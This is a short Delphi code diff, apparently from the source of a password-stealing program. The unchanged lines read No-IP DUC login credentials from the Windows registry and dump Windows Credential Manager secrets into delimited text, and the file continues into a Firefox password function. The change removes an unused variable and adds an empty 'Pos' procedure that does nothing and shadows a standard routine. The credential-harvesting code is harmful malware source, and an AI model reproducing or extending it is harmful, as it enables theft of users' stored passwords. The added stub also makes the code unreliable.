@@ -63,7 +63,7 @@ end;
 
 function noip_DUCpasswords(Delimitador: string): string;
 var
-  UserName, Host, Senha: string;
+  UserName, Senha: string;
 begin
   UserName := lerreg(HKEY_LOCAL_MACHINE, 'SOFTWARE\Vitalwerks\DUC', 'UserName', '');
   Senha := lerreg(HKEY_LOCAL_MACHINE, 'SOFTWARE\Vitalwerks\DUC', 'Password', '');
@@ -167,6 +167,11 @@ begin
     Result := Pchar(Result + DumpData(CredentialCollection[i].CredentialBlob, CredentialCollection[i].CredentialBlobSize) + Delimitador + #13#10);
   end;
   FreeLibrary(Handle);
+end;
+
+procedure Pos(const s1: String; const CurrentEntry: string);
+begin
+
 end;
 
 function GetFirefoxPasswords(Delimitador: string): string;
